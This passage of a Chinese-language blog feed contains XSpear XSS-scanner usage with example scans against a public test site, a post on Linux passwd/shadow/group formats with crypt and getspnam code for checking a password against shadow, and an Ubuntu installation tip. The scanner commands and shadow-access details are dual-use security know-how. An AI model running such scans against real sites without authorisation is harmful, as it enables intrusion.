&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;需要root用户&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;基础用法&quot;&gt;基础用法&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;Usage: xspear -u [target] -[options] [value]
[ e.g ]
$ xspear -u 'https://www.hahwul.com/?q=123' --cookie='role=admin' -v 1 -a 
$ xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 2
$ xspear -u 'http://testphp.vulnweb.com/listproducts.php?cat=123' -v 0 -o json

[ Options ]
    -u, --url=target_URL             [required] Target Url
    -d, --data=POST Body             [optional] POST Method Body data
    -a, --test-all-params            [optional] test to all params(include not reflected)
        --no-xss                     [optional] no testing xss, only parameters analysis
        --headers=HEADERS            [optional] Add HTTP Headers
        --cookie=COOKIE              [optional] Add Cookie
        --custom-payload=FILENAME    [optional] Load custom payload json file
        --raw=FILENAME               [optional] Load raw file(e.g raw_sample.txt)
        --raw-ssl=BOOLEAN            [optional] http/https switch for burp raw file e.g: true/false
    -p, --param=PARAM                [optional] Test paramters
    -b, --BLIND=URL                  [optional] Add vector of Blind XSS
                                      + with XSS Hunter, ezXSS, HBXSS, etc...
                                      + e.g : -b https://hahwul.xss.ht
    -t, --threads=NUMBER             [optional] thread , default: 10
    -o, --output=FORMAT              [optional] Output format (cli , json, html)
    -c, --config=FILENAME            [optional] Using config.json
    -v, --verbose=0~3                [optional] Show log depth
                                      + v=0 : quite mode(only result)
                                      + v=1 : show scanning status(default)
                                      + v=2 : show scanning logs
                                      + v=3 : show detail log(req/res)
    -h, --help                       Prints this help
        --version                    Show XSpear version
        --update                     Show how to update

&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;xss防范&quot;&gt;xss防范&lt;/h1&gt;</content><author><name></name></author><category term="安全" /><summary type="html">[toc]</summary></entry><entry><title type="html">passwd&amp;amp;shadow文件</title><link href="http://localhost:4000/_posts/2020-07-10-passwd&shadow%E6%96%87%E4%BB%B6/" rel="alternate" type="text/html" title="passwd&amp;shadow文件" /><published>2020-07-10T00:00:00-04:00</published><updated>2020-07-10T00:00:00-04:00</updated><id>http://localhost:4000/_posts/passwd&amp;shadow%E6%96%87%E4%BB%B6</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-10-passwd&amp;shadow%E6%96%87%E4%BB%B6/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;两文件均在&lt;code&gt;/etc&lt;/code&gt;目录下&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;passwd&quot;&gt;passwd&lt;/h1&gt;

&lt;p&gt;这个文件存放着所有用户帐号的信息，包括用户名和密码&lt;/p&gt;

&lt;p&gt;passwd文件由许多条记录组成，&lt;code&gt;每条记录占一行&lt;/code&gt;，记录了一个用户帐号的所有信息。每条记录由&lt;code&gt;7个字段&lt;/code&gt;组成，字段间用&lt;code&gt;冒号“：”隔开&lt;/code&gt;，其格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;username:password:User ID:Group ID:comment:home directory:shell
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;username:用户名 用户在登录时使用的就是它&lt;/li&gt;
  &lt;li&gt;password:该帐号的口令&lt;/li&gt;
  &lt;li&gt;User ID :用户识别码，简称UID,Linux系统内部使用UID来标识用户，而不是用户名&lt;/li&gt;
  &lt;li&gt;GROUP ID:用户组识别码，简称GID&lt;/li&gt;
  &lt;li&gt;comment :这是给用户帐号做的注解,可为空&lt;/li&gt;
  &lt;li&gt;home directory:主目录,这个目录属于该帐号，当用户登录后，它就会被置于此目录中，就像回到家一样。一般来说，root帐号的主目录是/root，其他帐号的家目录都在/home目录下，并且和用户名同名&lt;/li&gt;
  &lt;li&gt;shell :登录的shell&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;shadow&quot;&gt;shadow&lt;/h1&gt;

&lt;p&gt;为了增强系统的安全性，Linux系统还可以为用户提供MD5和Shadow安全密码服务。如果在安装 Linux 时在相关配置的选项上选中了MD5和Shadow服务，那么将看到的/etc/passwd文件里的passwd项上无论是什么用户，都是一个“x”，系统其实是把真正的密码数据放在了/etc/shadow文件里。/etc/shadow文件只能以root身份来浏览。&lt;/p&gt;

&lt;p&gt;格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;用户名：加密口令：上一次修改的时间（从1970年1月1日起的天数）：口令在两次修改间的最小天数：口令修改之前向用户发出警告的天数：口令终止后账号被禁用的天数：从1970年1月1日起账号被禁用的天数：保留域
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;在linux中，口令文件在/etc/passwd中，早期的这个文件直接存放加密后的密码，前两位是”盐”值，是一个随机数，后面跟的是加密的密码。为了安全，现在的linux都提供了 /etc/shadow这个影子文件，密码放在这个文件里面，并且是只有root可读的。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;缺省账号&quot;&gt;缺省账号&lt;/h1&gt;

&lt;p&gt;在利用了shadow文件的情况下，密码用一个x表示，普通用户看不到任何密码信息。如果你仔细的看看这个文件，会发现一些奇怪的用户名，她们是系  统的缺省账号，缺省账号是攻击者入侵的常用入口，因此一定要熟悉缺省账号，特别要注意密码域是否为空。下面简单介绍一下这些缺省账号&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;adm拥有账号文件，起始目录/var/adm通常包括日志文件&lt;/li&gt;
  &lt;li&gt;bin拥有用户命令的可执行文件&lt;/li&gt;
  &lt;li&gt;daemon用来执行系统守护进程&lt;/li&gt;
  &lt;li&gt;games用来玩游戏&lt;/li&gt;
  &lt;li&gt;halt用来执行halt命令&lt;/li&gt;
  &lt;li&gt;lp拥有打印机后台打印文件&lt;/li&gt;
  &lt;li&gt;mail拥有与邮件相关的进程和文件&lt;/li&gt;
  &lt;li&gt;news拥有与usenet相关的进程和文件&lt;/li&gt;
  &lt;li&gt;nobody被NFS（网络文件系统）使用&lt;/li&gt;
  &lt;li&gt;shutdown执行shutdown命令&lt;/li&gt;
  &lt;li&gt;sync执行sync命令&lt;/li&gt;
  &lt;li&gt;uucp拥有uucp工具和文件&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;/etc/passwd文件在很大范围内是可读的，因为许多应用程序需要用他来把UID转换为用户名，例如，如果不能访问/etc/passwd，那么ls -l命令将显示UID而不是用户名&lt;/p&gt;

&lt;h1 id=&quot;group补充&quot;&gt;group补充&lt;/h1&gt;

&lt;p&gt;etc/group  文件是用户组的配置文件，内容包括用户和用户组，并且能显示出用户是归属哪个用户组或哪几个用户组，因为一个用户可以归属一个或多个不同的用户组；同一用户组的用户之间具有相似的特征。比如我们把某一用户加入到root用户组，那么这个用户就可以浏览root用户家目录的文件，如果root用户把某个文件的读写执行权限开放，root用户组的所有用户都可以修改此文件，如果是可执行的文件（比如脚本），root用户组的用户也是可以执行的；用户组的特性在系统管理中为系统管理员提供了极大的方便，但安全性也是值得关注的，如某个用户下有对系统管理有最重要的内容，最好让用户拥有独立的用户组，或者是把用户下的文件的权限设置为完全私有；另外root用户组一般不要轻易把普通用户加入进去。&lt;/p&gt;

&lt;p&gt;格式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;group_name:passwd:GID:user_list
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;group_name:用户组名称&lt;/li&gt;
  &lt;li&gt;passwd:用户组密码&lt;/li&gt;
  &lt;li&gt;GID:GID&lt;/li&gt;
  &lt;li&gt;user_list:用户列表，每个用户之间用,号分割；本字段可以为空；如果字段为空表示用户组为GID的用户名；&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;密码破解&quot;&gt;密码破解&lt;/h1&gt;

&lt;p&gt;参照此篇&lt;a href=&quot;/_posts/2019-03-13-Hydra&quot;&gt;文章&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&quot;相关linux编程&quot;&gt;相关linux编程&lt;/h1&gt;

&lt;h2 id=&quot;函数介绍&quot;&gt;函数介绍&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;getpwuid&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;getpwnam&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;getpwnam, getpwnam_r, getpwuid, getpwuid_r - get password file entry&lt;/p&gt;
    &lt;/blockquote&gt;

    &lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;pwd.h&amp;gt;
struct passwd *getpwnam(const char *name);
struct passwd *getpwuid(uid_t uid);
int getpwnam_r(const char *name, struct passwd *pwd,
char *buf, size_t buflen, struct passwd **result);
int getpwuid_r(uid_t uid, struct passwd *pwd,
char *buf, size_t buflen, struct passwd **result);
Feature Test Macro Requirements for glibc (see feature_test_macros(7)):
getpwnam_r(), getpwuid_r():
_POSIX_C_SOURCE
|| /* Glibc versions &amp;lt;= 2.19: */ _BSD_SOURCE || _SVID_SOURCE
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;passwd结构体定义&lt;code&gt;&amp;lt;pwd.h&amp;gt;&lt;/code&gt;文件中，具体如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct passwd {
               char   *pw_name;       /* username */
               char   *pw_passwd;     /* user password */
               uid_t   pw_uid;        /* user ID */
               gid_t   pw_gid;        /* group ID */
               char   *pw_gecos;      /* user information */
               char   *pw_dir;        /* home directory */
               char   *pw_shell;      /* shell program */
           };
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;getgrgid&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;getgrgrnam&lt;/p&gt;

    &lt;blockquote&gt;
      &lt;p&gt;getgrnam, getgrnam_r, getgrgid, getgrgid_r - get group file entry&lt;/p&gt;
    &lt;/blockquote&gt;

    &lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;sys/types.h&amp;gt;
#include &amp;lt;grp.h&amp;gt;
  
struct group *getgrnam(const char *name);
  
struct group *getgrgid(gid_t gid);
  
int getgrnam_r(const char *name, struct group *grp,
char *buf, size_t buflen, struct group **result);
  
int getgrgid_r(gid_t gid, struct group *grp,
char *buf, size_t buflen, struct group **result);
  
Feature Test Macro Requirements for glibc (see feature_test_macros(7)):
  
getgrnam_r(), getgrgid_r():
_POSIX_C_SOURCE
|| /* Glibc versions &amp;lt;= 2.19: */ _BSD_SOURCE || _SVID_SOURCE
&lt;/code&gt;&lt;/pre&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;group结构体定义&lt;code&gt;&amp;lt;group.h&amp;gt;&lt;/code&gt;文件中，具体如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct group {
               char   *gr_name;        /* group name */
               char   *gr_passwd;      /* group password */
               gid_t   gr_gid;         /* group ID */
               char  **gr_mem;         /* NULL-terminated array of pointers
                                          to names of group members */
           };
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;shadow密码部分解析&quot;&gt;shadow密码部分解析&lt;/h2&gt;

&lt;p&gt;案例：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-markdown&quot;&gt;$6$/yP9fQlL$/2sALmuVqVSTCrBo5ObPl8v9cpOvSHX1dHOrAQORCNiB6fJc5.93po8RorRBWo1415wnOdd0EmNmgq.wpwYjE0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;以&lt;em&gt;$&lt;/em&gt;符为分割，&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;$6$：表示加密方法&lt;/li&gt;
  &lt;li&gt;$/yP9fQlL$ :杂质串,需要原串或上这个杂质串,然后经过第一个&lt;em&gt;$&lt;/em&gt;间定义的加密方式进行加密,然后获得第三个&lt;em&gt;$&lt;/em&gt;间的内容&lt;/li&gt;
  &lt;li&gt;$/2sALmuVqVSTCrBo5ObPl8v9cpOvSHX1dHOrAQORCNiB6fJc5.93po8RorRBWo1415wnOdd0EmNmgq.wpwYjE0 :加密生成的&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;相关函数&quot;&gt;相关函数&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;getspnam&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;getspnam, getspnam_r, getspent, getspent_r, setspent, endspent, fgetspent, fgetspent_r, sgetspent,
  sgetspent_r, putspent, lckpwdf, ulckpwdf - get shadow password file entry&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;shadow.h&amp;gt;
struct spwd *getspnam(const char *name);
struct spwd *getspent(void);
void setspent(void);
void endspent(void);
struct spwd *fgetspent(FILE *stream);
struct spwd *sgetspent(const char *s);
int putspent(const struct spwd *p, FILE *stream);
int lckpwdf(void);
int ulckpwdf(void);
/* GNU extension */
#include &amp;lt;shadow.h&amp;gt;
int getspent_r(struct spwd *spbuf,
char *buf, size_t buflen, struct spwd **spbufp);
int getspnam_r(const char *name, struct spwd *spbuf,
char *buf, size_t buflen, struct spwd **spbufp);
int fgetspent_r(FILE *stream, struct spwd *spbuf,
char *buf, size_t buflen, struct spwd **spbufp);
int sgetspent_r(const char *s, struct spwd *spbuf,
char *buf, size_t buflen, struct spwd **spbufp);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;相应结构体为于&lt;code&gt;&amp;lt;shadow.h&amp;gt;&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;struct spwd {
               char *sp_namp;     /* Login name */
               char *sp_pwdp;     /* Encrypted password */
               long  sp_lstchg;   /* Date of last change
                                     (measured in days since
                                     1970-01-01 00:00:00 +0000 (UTC)) */
               long  sp_min;      /* Min # of days between changes */
               long  sp_max;      /* Max # of days between changes */
               long  sp_warn;     /* # of days before password expires
                                     to warn user to change it */
               long  sp_inact;    /* # of days after password expires
                                     until account is disabled */
               long  sp_expire;   /* Date when account expires
                                     (measured in days since
                                     1970-01-01 00:00:00 +0000 (UTC)) */
               unsigned long sp_flag;  /* Reserved */
           };
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;crypt&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;crypt, crypt_r - password and data encryption&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#define _XOPEN_SOURCE       /* See feature_test_macros(7) */
#include &amp;lt;unistd.h&amp;gt;

char *crypt(const char *key, const char *salt);

#define _GNU_SOURCE         /* See feature_test_macros(7) */
#include &amp;lt;crypt.h&amp;gt;

char *crypt_r(const char *key, const char *salt,
              struct crypt_data *data);
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;注意：编译时需要带上&lt;code&gt; -lcrypt.&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;结合shadow文件密码部分，发现&lt;code&gt;crypt&lt;/code&gt;函数参数并没有定义加密方法，其实这个部分被整合到salt部分去了，参照如下：&lt;/p&gt;

&lt;p&gt;The glibc2 version of this function supports additional encryption algorithms.&lt;/p&gt;

&lt;p&gt;If salt is a character string starting with the characters “$id$” followed by a string  optionally
   terminated by “$”, then the result has the form:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;      $id$salt$encrypted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;id  identifies  the encryption method used instead of DES and this then determines how the rest of
   the password string is interpreted.  The following values of id are supported:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ID&lt;/th&gt;
      &lt;th&gt;Method&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;MD5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2a&lt;/td&gt;
      &lt;td&gt;Blowfish (not in mainline glibc; added in some Linux distributions)&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;SHA-256&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;SHA-512&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Thus, $5$salt$encrypted and $6$salt$encrypted contain the password encrypted  with,  respectively,
   functions based on SHA-256 and SHA-512.&lt;/p&gt;

&lt;p&gt;“salt”  stands  for the up to 16 characters following “$id$” in the salt.  The “encrypted” part of
   the password string is the actual computed password.  The size of this string is fixed:&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;MD5&lt;/td&gt;
      &lt;td&gt;22 characters&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SHA-256&lt;/td&gt;
      &lt;td&gt;43 characters&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SHA-512&lt;/td&gt;
      &lt;td&gt;86 characters&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The characters in “salt” and “encrypted” are drawn from the set [a-zA-Z0-9./].  In the MD5 and SHA
   implementations the entire key is significant (instead of only the first 8 bytes in DES).&lt;/p&gt;

&lt;p&gt;Since glibc 2.7, the SHA-256 and SHA-512 implementations support a user-supplied number of hashing
   rounds, defaulting to 5000.  If the “$id$” characters in the salt are followed  by  “rounds=xxx$”,
   where xxx is an integer, then the result has the form&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;      $id$rounds=yyy$salt$encrypted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;where  yyy  is  the number of hashing rounds actually used.  The number of rounds actually used is
   1000 if xxx is less than 1000, 999999999 if xxx is greater than 999999999, and  is  equal  to  xxx
   otherwise&lt;/p&gt;

&lt;p&gt;检测用户密码例子&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;代码不规范，没有做一些判断处理等细节&lt;/p&gt;

  &lt;p&gt;编译： gcc checkpass.c -lcrypt -D _XOPEN_SOURCE&lt;/p&gt;

  &lt;p&gt;注意需要用root用户去运行(需要访问shadow文件)，不然会有段错误&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;shadow.h&amp;gt;
int main(int argc,char ** argv[])
{
    char *input_pass;
    struct spwd *shadowline;
    char *crypt_pass;
    if(argc &amp;lt; 2)
    {
        fprintf(stderr,&quot;usage ...\n&quot;);
        exit(EXIT_SUCCESS);
    }
    //获取用户口令
    //关闭输入回显
    input_pass = getpass(&quot;PassWord:&quot;);
    shadowline =  getspnam(argv[1]);
    crypt_pass = crypt(input_pass,shadowline-&amp;gt;sp_pwdp);
    if(strcmp(shadowline-&amp;gt;sp_pwdp,crypt_pass) == 0)
    {
        puts(&quot;ok&quot;);
    }
    else
    {
        puts(&quot;error&quot;);
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;</content><author><name></name></author><category term="linux" /><summary type="html">[toc]</summary></entry><entry><title type="html">ubuntu安装问题及后续配置</title><link href="http://localhost:4000/_posts/2020-07-08-ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE/" rel="alternate" type="text/html" title="ubuntu安装问题及后续配置" /><published>2020-07-08T00:00:00-04:00</published><updated>2020-07-08T00:00:00-04:00</updated><id>http://localhost:4000/_posts/ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-08-ubuntu%E5%AE%89%E8%A3%85%E9%97%AE%E9%A2%98%E5%8F%8A%E5%90%8E%E7%BB%AD%E9%85%8D%E7%BD%AE/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;h1 id=&quot;安装&quot;&gt;安装&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;镜像下载：&lt;a href=&quot;https://ubuntu.com/&quot;&gt;地址&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;win平台制作启动盘软件：软碟通&lt;/li&gt;
  &lt;li&gt;linux制作启动盘：dd命令：dd if=镜像位置 of= U盘挂载位置&lt;/li&gt;
  &lt;li&gt;设置BOIS引导启动，后安装，此处不赘述&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;安装中出现的问题&quot;&gt;安装中出现的问题&lt;/h1&gt;

&lt;h2 id=&quot;卡死&quot;&gt;卡死&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;卡死在logo界面等等&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;一般是因为ubuntu自带nouveau显卡驱动，且是默认的驱动，与本机N卡冲突&lt;/p&gt;

&lt;p&gt;解决方法：&lt;/p&gt;

&lt;p&gt;在启动U盘时，当看到&lt;code&gt;Try Ubuntu ，Install Ubuntu&lt;/code&gt;时，按下&lt;code&gt;e&lt;/code&gt;键，把出现的文字中&lt;code&gt;quiet splash&lt;/code&gt;改为&lt;code&gt;nomodeset&lt;/code&gt;，然后按&lt;code&gt;F10&lt;/code&gt;重启&lt;/p&gt;

&lt;p&gt;后续即可进入桌面进行安装了&lt;/p&gt;</content><author><name></name></author><category term="linux" /><summary type="html">[toc]</summary></entry></feed>